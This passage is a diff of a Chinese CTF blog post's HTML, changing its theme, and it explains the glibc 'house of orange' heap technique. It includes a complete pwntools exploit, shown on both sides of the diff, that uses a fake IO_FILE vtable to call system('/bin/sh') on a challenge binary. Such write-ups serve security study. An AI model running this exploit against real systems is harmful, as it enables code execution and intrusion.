 <p>所以这里通过将_IO_list_all修改为main_arena+0x58,这时IO_list_all中的 *chain指针位于 _IO_list_all + 0x68的位置，也就是 main_arena + 0x58 + 0x68–&gt;small bin中大小为0x60的位置，所以将之前old top chunk的size修改为0x60，old top chunk就会链入small bin中，这时就可以将伪造的fake_file链入IO_all_list中,将fake_file的vtable指向伪造的IO_jump_t结构的地址，在伪造的 IO_jump_t 结构体中，在overflow函数处写入system函数，则最终会调用system函数</p>
 <p>伪造的file结构体要通过的条件</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   </span><br><span class="line">或者是</span><br><span class="line"><span class="number">2.</span></span><br><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span> </span><br><span class="line">&amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> </span><br><span class="line">&amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br></pre></td></tr></table></figure>
+<pre><code class="c">1.((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
+
+或者是
+2.
+_IO_vtable_offset (fp) == 0 
+&amp;&amp; fp-&gt;_mode &gt; 0 
+&amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)
+</code></pre>
 <p>一般来说上面比较好伪造，我下面的exp也是伪造的上面的</p>
 <p>如果伪造下面的话还要关注一下_wide_data结构体，这里就略过了</p>
 </li>
 </ul>
 <p>  查看是否为伪造成功</p>
-<p>  <img src="/picture/1537450312091.png" alt="1111"></p>
+<p>  <img src="/picture/1537450312091.png" srcset="/img/loading.gif" alt="1111"></p>
 <p>  此时的vtable已经指向伪造的函数表了</p>
-<p>  <img src="/picture/1537450340051.png" alt="1537450340051"></p>
+<p>  <img src="/picture/1537450340051.png" srcset="/img/loading.gif" alt="1537450340051"></p>
 <p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./houseoforange'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./houseoforange'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span><span class="params">()</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(length, nm, pz, color)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.send(nm)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(pz))</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(length, nm, pz, color)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.send(nm)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(pz))</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(color))</span><br><span class="line"></span><br><span class="line">build(<span class="number">0x30</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">123</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) +<span class="string">'a'</span>*<span class="number">16</span>+ p64(<span class="number">0</span>)+ p64(<span class="number">0xf80</span>)</span><br><span class="line">upgrade(len(payload),payload,<span class="number">123</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">build(<span class="number">0x1000</span>,<span class="string">'b'</span>,<span class="number">123</span>,<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">'-----------------------leak address-------------------------'</span>)</span><br><span class="line">build(<span class="number">0x400</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">123</span>,<span class="number">1</span>)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak <span class="number">-1640</span>- <span class="number">0x3c4b20</span>  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc base address --&gt;[%s]"</span>%hex(libc_base)</span><br><span class="line"></span><br><span class="line">upgrade(<span class="number">0x400</span>,<span class="string">'a'</span>*<span class="number">16</span>,<span class="number">123</span>,<span class="number">1</span>)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">16</span>)</span><br><span class="line">leak_heap = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base = leak_heap - <span class="number">0xe0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak_heap --&gt;[%s]"</span>%hex(leak_heap)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_base --&gt;[%s]"</span>%hex(heap_base)</span><br><span class="line"></span><br><span class="line">_IO_list_all = libc.symbols[<span class="string">'_IO_list_all'</span>] + libc_base</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line">log.info(<span class="string">'-------------------------unsorted bin and build fake file--------------------------'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x400</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">fake_file = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x60</span>) </span><br><span class="line"><span class="comment">#这里写入binsh字符串是因为最后调用vtable中的函数时会将IO_FILE的指针作为参数</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>)<span class="comment">#unsorted bin attack</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#bypass check </span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x5e8</span>)<span class="comment">#vtable</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">upgrade(<span class="number">0x800</span>,payload,<span class="number">123</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import*
+context.log_level = &#39;debug&#39;
 
-      
-    </div>
+p = process(&#39;./houseoforange&#39;)
+elf = ELF(&#39;./houseoforange&#39;)
+libc = elf.libc
 
-    
+def menu(idx):
+    p.recvuntil(&#39;: &#39;)
+    p.sendline(str(idx))
 
-    
-    
-    
+def see():
+    menu(2)
 
-    
+def build(length, nm, pz, color):
+    menu(1)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(length))
+    p.recvuntil(&quot;:&quot;)
+    p.send(nm)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(pz))
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(color))
 
-    
-      
-    
-    
+def upgrade(length, nm, pz, color):
+    menu(3)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(length))
+    p.recvuntil(&quot;:&quot;)
+    p.send(nm)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(pz))
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(color))
 
-    
-      <div>
-        
+build(0x30,&#39;a&#39;*8,123,1)
+#gdb.attach(p)
 
+payload = &#39;a&#39;*0x30 + p64(0) + p64(0x21) +&#39;a&#39;*16+ p64(0)+ p64(0xf80)
+upgrade(len(payload),payload,123,2)
 
+build(0x1000,&#39;b&#39;,123,1)
+log.info(&#39;-----------------------leak address-------------------------&#39;)
+build(0x400,&#39;a&#39;*8,123,1)
+see()
+p.recvuntil(&quot;a&quot;*8)
+leak = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+libc_base = leak -1640- 0x3c4b20  
+print &quot;libc base address --&gt;[%s]&quot;%hex(libc_base)
 
+upgrade(0x400,&#39;a&#39;*16,123,1)
+see()
+p.recvuntil(&#39;a&#39;*16)
+leak_heap = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+heap_base = leak_heap - 0xe0
+print &quot;leak_heap --&gt;[%s]&quot;%hex(leak_heap)
+print &quot;heap_base --&gt;[%s]&quot;%hex(heap_base)
 
-  
+_IO_list_all = libc.symbols[&#39;_IO_list_all&#39;] + libc_base
+system = libc.symbols[&#39;system&#39;] + libc_base
+log.info(&#39;-------------------------unsorted bin and build fake file--------------------------&#39;)
+payload = &#39;a&#39;*0x400
+payload += p64(0) + p64(0x21) + &#39;a&#39;*0x10
+fake_file = &#39;/bin/sh\x00&#39; + p64(0x60) 
+#这里写入binsh字符串是因为最后调用vtable中的函数时会将IO_FILE的指针作为参数
+fake_file += p64(0) + p64(_IO_list_all - 0x10)#unsorted bin attack
+fake_file += p64(0) + p64(1) #bypass check 
+fake_file = fake_file.ljust(0xc0,&#39;\x00&#39;)
 
+payload += fake_file
+payload += p64(0)*3
+payload += p64(heap_base + 0x5e8)#vtable
+payload += p64(0)*2
+payload += p64(system)
+upgrade(0x800,payload,123,1)
 
+p.recv()
+p.sendline(&#39;1&#39;)
+p.interactive()
 
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>zs0zrc</li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    
-    <a href="http://yoursite.com/2018/09/19/2018-9-19-house_of_orange/" title="house_of_orange">http://yoursite.com/2018/09/19/2018-9-19-house_of_orange/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
-</ul>
+</code></pre>
 
-      </div>
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-            <a href="/tags/houseofxxx/" rel="tag"># houseofxxx</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/09/18/2018-9-18-house_of_roman/" rel="next" title="house_of_roman">
-                <i class="fa fa-chevron-left"></i> house_of_roman
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/09/19/2018-9-19-stack-writeup/" rel="prev" title="stack writeup">
-                stack writeup <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
-            
-              <p class="site-author-name" itemprop="name">zs0zrc</p>
-              <div class="site-description motion-element" itemprop="description">zs0zrc's blog</div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+            </div>
+            <hr>
+            <div>
+              <p>
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">53</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Heap-Exploitation/">Heap_Exploitation</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
+                  <span>
+                <i class="iconfont icon-tag"></i>
                     
-                      <a href="/categories/">
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                     
-                  
+                      <a class="hover-with-bg" href="/tags/houseofxxx/">houseofxxx</a>
                     
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                  </span>
                 
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
+              </p>
               
-            </nav>
-          
-
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/zszcr" title="GitHub &rarr; https://github.com/zszcr" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/1PFjclRQBHRAuEE" title="Twitter &rarr; https://twitter.com/1PFjclRQBHRAuEE" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
               
             </div>
-          
 
-          
-             <div class="cc-license motion-element" itemprop="license">
-              
-              
-                
-              
-              
-              
-              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
-             </div>
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://23r3f.github.io/" title="https://23r3f.github.io/" rel="noopener" target="_blank">23R3F</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://myhackerworld.top/" title="http://myhackerworld.top/" rel="noopener" target="_blank">D4rk3r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://m4x.fun/" title="http://m4x.fun/" rel="noopener" target="_blank">M4X</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://n132.github.io/" title="https://n132.github.io/" rel="noopener" target="_blank">n13r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://aluvion.github.io/" title="https://aluvion.github.io/" rel="noopener" target="_blank">Twings</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://littleredlie.github.io/" title="https://littleredlie.github.io/" rel="noopener" target="_blank">LittleRed</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://glarcy.github.io/" title="https://glarcy.github.io/" rel="noopener" target="_blank">Glarcy</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
             
-          
-          
-
+          </div>
         </div>
       </div>
-
-      
-
-      
-
     </div>
-  </aside>
-  
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
-
-  
-
-  
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
 </div>
 
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.1.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
       </div>
     
+  </div>
+</div>
+
+<!-- Custom -->
+
 
     
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
 
     
 
     
   </div>
+</footer>
 
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <script src="/js/lazyload.js"></script>
 
 
 
   
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var post = $('#post');
+      var toc = $('#toc');
+      var tocLimMax = post.offset().top + post.height() - navHeight;
 
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
 
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/utils.js?v=7.1.0"></script>
-
-  <script src="/js/motion.js?v=7.1.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/affix.js?v=7.1.0"></script>
-
-  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
-
-
-
-  
-  <script src="/js/scrollspy.js?v=7.1.0"></script>
-<script src="/js/post-details.js?v=7.1.0"></script>
-
-
-
-  
-
-
-  <script src="/js/next-boot.js?v=7.1.0"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = $('#board-ctn').css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
-  
 
-  
 
-  
 
-  
+  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
 
-  
 
-  
 
-  
+<!-- Plugins -->
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "house_of_orange&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
